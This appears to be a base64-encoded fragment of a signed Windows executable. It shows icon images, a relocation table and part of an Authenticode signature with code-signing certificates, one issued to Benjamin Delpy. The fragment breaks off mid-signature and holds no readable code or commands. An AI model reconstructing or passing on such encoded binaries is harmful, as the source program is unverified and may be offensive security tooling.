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/4AAgf8AAGPWAABnVQAAjmsAAKz/gACr/8AArP/gAbX/8AOx//gHkf/+DwRwAAABAAMAMDAAAAEAIACoJQAAAQAgIAAAAQAgAKgQAAACABAQAAABACAAaAQAAAMAAAAAAAAAAAAAoAEAFAEAAJCnqKewp/inAKiQqJiooKiwqMCoyKjQqNioGKpoqnCqeKqIqpCqmKqgqqiqsKq4qsCqyKrQqtiq4KroqvCq+KoAqwirEKsYqyCrKKswqzirQKtIq1CrWKtgq2ircKt4q4CriKuQq5iroKuoq7CruKvAq8ir0KvYq+Cr6Kvwq/irAKwIrBCsGKwgrCisIK0orTCtOK1ArUitUK1YrWCtaK1wrXitgK2IrZCtmK2graitwK3IrdCt2K3greit8K34rQCuCK4grkCuYK6AroiuoK6orsCuyK7Qrtiu4K7orvCuCK8gryivMK84r0CvSK9Qr1ivYK9or3CveK+Ar4ivoK+4r8CvyK/Yr/Cv+K8AsAEAJAIAAACgCKAQoBigIKAooDCgOKBAoEigUKBYoGCgaKBwoHiggKCIoJCgmKCgoKigsKC4oMCgyKDQoNig4KDooPCg+KAAoQihEKEYoTChSKFQoWihgKGIoZChmKGgoaihsKG4ocChyKHQodih4KHoofCh+KEAogiiEKIYoiCiKKIwojiiQKJIomCieKKAopiioKKoorCiuKLAosii0KLYouCi6KLwoviiAKMYozCjOKNAo0ijUKNYo2CjaKNwo3ijgKOIo5CjmKOgo6ijsKPAo8ij0KPYo+Cj6KPwo/ijAKQIpBCkGKSwpMCkyKTQpOCk6KQApQilIKUopTClQKVIpVClYKVopXClgKWIpaClqKXApcil4KXopQCmCKYgpiimQKZIpmCmaKaApoimoKaoprCmuKbApsim0KbYpuCm6KYApyCnKKcwpzinQKdIp1CnWKdgp2incKd4p4CniKeQp5inoKeop7CnuKfQp9in4KfwpwCoEKggqDCoQKhQqGCocKh4qICoiKiQqJiooKioqLCouKjAqMio0KjYqOCo6KjwqPioAKkIqRCpGKkgqSipMKlAqVCpYKlwqYCpkKmgqbCpwKnQqeCp8KkAqhCqIKowqkCqcKp4qoCqiKqQqpiqoKqoqrCquKrAqsiq0KrYquCq6KrwqviqAKsIqxCrGKsgqyirMKs4q0CrSKtQq1irYKtoq3CreKuIq5CrmKsAAACwAgCoAAAAEKAYoDCgMKM4o0ijkKPgozCkcKR4pIik0KQQpRilKKWQpeClMKZwpnimiKbApsim2KYgp2CnaKd4p8CnEKhgqKCouKgwqYCp0KkgqnCqsKrIqgCrCKsYq3CrwKsQrGCssKwArUCtSK1QrVitYK1orXCteK2ArYitkK2YraCtqK0IrhCuoK6wrvCuAK9Ar1CvkK+gr9Cv2K/gr+iv8K/4rwDAAgCYAAAAAKAwoECgcKB4oICgiKCQoJigoKCooLCguKDAoMig0KDYoAChEKFQoWChoKGwoTCiQKKAopCi0KLgolCjYKOgo7Cj8KNApJCkAKUQpVClYKWgpbCl6KUgpiimMKY4pkCmSKZQplimYKZopnCmeKaApoimkKaYpqCmsKa4psCmyKbQptim4KbopvCm+KYApwinAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPAXAAAAAgIAMIIX4wYJKoZIhvcNAQcCoIIX1DCCF9ACAQExDzANBglghkgBZQMEAgEFADBcBgorBgEEAYI3AgEEoE4wTDAXBgorBgEEAYI3AgEPMAkDAQCgBKICgAAwMTANBglghkgBZQMEAgEFAAQgjs42H9FG+oN9yFNGTala9ly4xgkk0HAm5wCBwJheX/qgggiJMIIEKDCCAxCgAwIBAgILBAAAAAABL07hNVwwDQYJKoZIhvcNAQEFBQAwVzELMAkGA1UEBhMCQkUxGTAXBgNVBAoTEEdsb2JhbFNpZ24gbnYtc2ExEDAOBgNVBAsTB1Jvb3QgQ0ExGzAZBgNVBAMTEkdsb2JhbFNpZ24gUm9vdCBDQTAeFw0xMTA0MTMxMDAwMDBaFw0xOTA0MTMxMDAwMDBaMFExCzAJBgNVBAYTAkJFMRkwFwYDVQQKExBHbG9iYWxTaWduIG52LXNhMScwJQYDVQQDEx5HbG9iYWxTaWduIENvZGVTaWduaW5nIENBIC0gRzIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCyTxTnEL7XJnKrNpfvU79ChF5Y0Yoo/ENGb34oRFALdV0A1zwKRJ4gaqT3RUo3YKNuPxL6bfq2RsNqo7gMJygCVyjRUPdhOVW4w+ElhlI8vwUd17Oa+JokMUnVoqni05GrPjxz7/Yp8cg10DB7f06SpQaPh+LO9cFjZqwYaSrBXrta6G6V/zuAYp2Zx8cvZtX9YhqCVVrG+kB3jskwPBvw8jW4bFmc/enWyrRAHvcEytFnqXTjpQhU2YM1O46MIwx1tt6GSp4aPgpQSTic0qiQv5j6yIwrJxF+KvvO3qmuOJMi+qbs+1xhdsNE1swMfi9tBoCidEC7tx/0O9dzVB/zAgMBAAGjgfowgfcwDgYDVR0PAQH/BAQDAgEGMBIGA1UdEwEB/wQIMAYBAf8CAQAwHQYDVR0OBBYEFAhu2Lacir/tPtfDdF3MgB+oL1B6MEcGA1UdIARAMD4wPAYEVR0gADA0MDIGCCsGAQUFBwIBFiZodHRwczovL3d3dy5nbG9iYWxzaWduLmNvbS9yZXBvc2l0b3J5LzAzBgNVHR8ELDAqMCigJqAkhiJodHRwOi8vY3JsLmdsb2JhbHNpZ24ubmV0L3Jvb3QuY3JsMBMGA1UdJQQMMAoGCCsGAQUFBwMDMB8GA1UdIwQYMBaAFGB7ZhpFDZfKiVAvfQTNNKj//P1LMA0GCSqGSIb3DQEBBQUAA4IBAQAiXMXdPfQLcNjj9efFjgkBu7GWNlxaB63HqERJUSV6rg2kGTuSnM+5Qia7O2yX58fOEW1okdqNbfFTTVQ4jGHzyIJ2ab6BMgsxw2zJniAKWC/wSP5+SAeq10NYlHNUBDGpeA07jLBwwT1+170vKsPi9Y8MkNxrpci+aF5dbfh40r5JlR4VeAiR+zTIvoStvODG3Rjb88rwe8IUPBi4A7qVPiEeP2Bpen9qA56NSvnwKCwwhF7sJnJCsW3LZMMSjNaES2dBfLEDF3gJ462otpYtpH6AA0+I98FrWkYVzSwZi9hwnOUtSYhgcqikGVJwQ17a1kYDsGgOJO9K9gslJO8kMIIEWTCCA0GgAwIBAgISESFpQXocPvRqMB+ZOF9QaA+gMA0GCSqGSIb3DQEBBQUAMFExCzAJBgNVBAYTAkJFMRkwFwYDVQQKExBHbG9iYWxTaWduIG52LXNhMScwJQYDVQQDEx5HbG9iYWxTaWduIENvZGVTaWduaW5nIENBIC0gRzIwHhcNMTEwNjI4MDk0NjE2WhcNMTQwNjI4MDk0NjE2WjAmMQswCQYDVQQGEwJGUjEXMBUGA1UEAxMOQmVuamFtaW4gRGVscHkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCodm+TRcdU0WacDxX4iKI1y42RFjlsTKluLp8wbxKOuTGFFVOOvXylyCDbQIMm77XfEQmH8U8sRH6ACwP8jh9MqLtguot1+NLKQaj8mTs/5zGdqp2c++V4I5ISXU7t6AqMF+S65pmPN366zf1Vrxk1k7ZmD6Y93CWtfeMwpuMDjyjntc3xgPJIeXDCyYm9VGls6MIwzbEfs6K0H7Ws8g3gqzi6UDyEUzlqDeuWFTO1CsJuQr9ReTCtG7QBLqFMGOuN8FfluoWhZRmn5JU2f6IzaV9U7zRb1fP6oTbhi06o5k/piD1+Xq27KqIw7aoXyevfWDAcRxqiQVAD6AQX5lPbAgMBAAGjggFUMIIBUDAOBgNVHQ8BAf8EBAMCB4AwTAYDVR0gBEUwQzBBBgkrBgEEAaAyATIwNDAyBggrBgEFBQcCARYmaHR0cHM6Ly93d3cuZ2xvYmFsc2lnbi5jb20vcmVwb3NpdG9yeS8wCQYDVR0TBAIwADATBgNVHSUEDDAKBggrBgEFBQcDAzA+BgNVHR8ENzA1MDOgMaAvhi1odHRwOi8vY3JsLmdsb2JhbHNpZ24uY29tL2dzL2dzY29kZXNpZ25nMi5jcmwwUAYIKwYBBQUHAQEERDBCMEAGCCsGAQUFBzAChjRodHRwOi8vc2VjdXJlLmdsb2JhbHNpZ24uY29tL2NhY2VydC9nc2NvZGVzaWduZzIuY3J0MB0GA1UdDgQWBBTha/S9+r+hnA0pv8P/Cw6SsKly/zAfBgNVHSMEGDAWgBQIbti2nIq/7T7Xw3RdzIAfqC9QejANBgkqhkiG9w0BAQUFAAOCAQEAf7Pg95qUL0lP1uXNQvBO6jNCDcjGKFt5gH1OjNRexl+ppavPUWSCgnMC9RzJJOSERhxn1rMzjruvORKd2gttYXolutU/ftSvPJNL7Y1oMJHnK5NmjWYjZw2cxtj0mZ6JbsbHB9WsrdyuiZvjrkKUXvvZ5go2v7Seb+8JF58CxcSQWcFZwsyvLp4XHc0Edt+/+7fzpNWaNu+eeTGqq5yYIVJ+YIHCpXzniGPKr4HLUFN5VhkTILSAU1UrPuK8ZIeK6QMQWopNSoW/I1BA0CIVYBFDqpowTutQWDVPkZUGnOsIzfHwfsBXW2Sw0YQJR98HDDxlVxIm2oldoUrGrlvTuDGCDs0wgg7JAgEBMGcwUTELMAkGA1UEBhMCQkUxGTAXBgNVBAoTEEdsb2JhbFNpZ24gbnYtc2ExJzAlBgNVBAMTHkdsb2JhbFNpZ24gQ29kZVNpZ25pbmcgQ0EgLSBHMgISESFpQXocPvRqMB+ZOF9QaA+gMA0GCWCGSAFlA